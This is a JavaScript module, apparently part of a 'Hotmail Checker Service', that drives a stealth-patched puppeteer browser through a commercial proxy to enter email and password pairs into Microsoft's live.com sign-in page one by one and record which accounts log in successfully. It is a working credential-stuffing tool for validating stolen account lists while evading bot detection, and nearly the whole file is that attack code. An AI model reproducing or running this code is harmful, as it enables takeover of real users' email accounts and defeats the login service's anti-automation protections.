/*
*  Private License
* Author : 
* 6 May 2021 - t.me/akamaized
*
*/

/* start of file */
require('dotenv').config();
const colors = require('./colors');
const moment = require("moment");
const puppeteer = require("puppeteer-extra");
const { PendingXHR } = require('pending-xhr-puppeteer');
const StealthPlugin = require("puppeteer-extra-plugin-stealth");
puppeteer.use(StealthPlugin());

const ENABLE_PROXY = process.env.ENABLE_PROXY == 'on' ? true : false;

module.exports.start = async (no, total, email, password, pathFile) => {
  try {
    console.log(colors.primary, `   [${no}/${total}] Hotmail Checker Service ${moment().format('llll')} - from ${pathFile} Checking ${email}`);

    ENABLE_PROXY ?
      browser = await puppeteer.launch({
        headless: false,
        args: [`--proxy-server=${process.env.PROXY_HOST || "gate.dc.smartproxy.com:20000"}`],
      }) : '';

    const [page] = await browser.pages();
    await page.setViewport({ width: 1366, height: 768 });
    await page.setDefaultNavigationTimeout(0);
    const pendingXHR = new PendingXHR(page);

    ENABLE_PROXY ?
      await page.authenticate({
        username: process.env.PROXY_USERNAME,
        password: process.env.PROXY_PASSWORD
      }) : '';

    await page.goto('https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1620305484&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3dbe461a10-291b-e4a9-12f2-b366d61f4e0c&id=292841&aadredir=1&whr=hotmail.com&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015');

    await page.waitForSelector(`input[name="loginfmt"]`, { timeout: 0 });

    console.log(colors.primary, `   Input email address`);
    const inputEmail = await page.$(`input[name="loginfmt"]`);
    await inputEmail.type(email);

    await page.waitForTimeout(1000);

    console.log(colors.primary, `   Click Next`)
    const btnNext = await page.$(`input[class="button ext-button primary ext-primary"]`);
    btnNext.click();

    await page.waitForTimeout(1500);

    if (await page.$(`div[id="usernameError"]`) !== null) {
      const usernameErrorElement = await page.$(`div[id="usernameError"]`);
      const usernameErrorText = await page.evaluate(element => element.textContent, usernameErrorElement);
      console.log(colors.error, `   Hotmail Checker Service - ${moment().format('llll')} ${email}: ${usernameErrorText}`);
      console.log(colors.error, `   Hotmail Checker Service - ${moment().format('llll')} ${email} | DIE`);
      await browser.close();
      return false;
    }

    await page.waitForSelector(`a[id="idA_PWD_ForgotPassword"]`, { timeout: 0 });

    console.log(colors.primary, `   Input password`);
    const inputPassword = await page.$(`input[name="passwd"]`);
    await inputPassword.type(password);

    await page.waitForTimeout(1000);

    console.log(colors.primary, `   Trying sign in`);
    const btnSignInModal = await page.$(`input[class="button ext-button primary ext-primary"]`);

    const [_, navigation] = await Promise.allSettled([
      btnSignInModal.click(),
      page.waitForNavigation({ timeout: 15000 }),
    ]);

    await pendingXHR.waitForAllXhrFinished();
    await page.setRequestInterception(true);

    if (navigation.status === 'fulfilled') {
      await browser.close();
      return true;
    } else {
      await browser.close();
      return false
    }
  } catch (e) {
    console.log("   Checker Fail");
    console.log("   Report issue to  directly or akamaized241@protonmail.com");
    console.log(`   Error : ${e}`);
    process.exit(0);
  }
}
/* end of file */